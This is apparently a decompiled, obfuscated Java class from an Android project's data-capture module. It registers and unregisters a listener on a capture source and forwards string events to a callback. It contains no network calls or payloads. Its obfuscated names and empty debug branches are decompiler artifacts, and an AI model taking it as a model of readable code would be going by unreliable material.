package com.vvt.al.e;

import com.vvt.base.capture.e;
import com.vvt.base.capture.h;
import com.vvt.base.capture.i;

public class b
  implements e, h
{
  private static final boolean a = com.vvt.ak.a.a;
  private com.vvt.base.capture.a b;
  private i c;
  private com.vvt.capture.e.b.b.b d;
  private boolean e = false;
  
  public b(com.vvt.n.a.b paramb, String paramString1, String paramString2)
  {
    com.vvt.capture.e.b.b.b localb = com.vvt.capture.e.b.b.b.a(paramb, paramString1, paramString2);
    this.d = localb;
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    i locali = this.c;
    if (locali != null)
    {
      locali = this.c;
      locali.a();
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (!bool)
    {
      bool = true;
      this.e = bool;
      this.c = parami;
      com.vvt.capture.e.b.b.b localb = this.d;
      localb.a(this);
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    i locali = this.c;
    if (locali != null)
    {
      boolean bool = a;
      if (bool) {}
      locali = this.c;
      locali.a(paramString);
    }
  }
  
  public void a(String paramString1, String paramString2)
  {
    i locali = this.c;
    if (locali != null)
    {
      boolean bool = a;
      if (bool) {}
      locali = this.c;
      locali.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      this.e = false;
      bool = false;
      this.c = null;
      com.vvt.capture.e.b.b.b localb = this.d;
      localb.b(this);
    }
    bool = a;
    if (bool) {}
  }
  
  public void c()
  {
    boolean bool = this.e;
    if (bool)
    {
      com.vvt.base.capture.a locala = this.b;
      if (locala != null)
      {
        bool = a;
        if (bool) {}
        locala = this.b;
        locala.a();
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/e/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */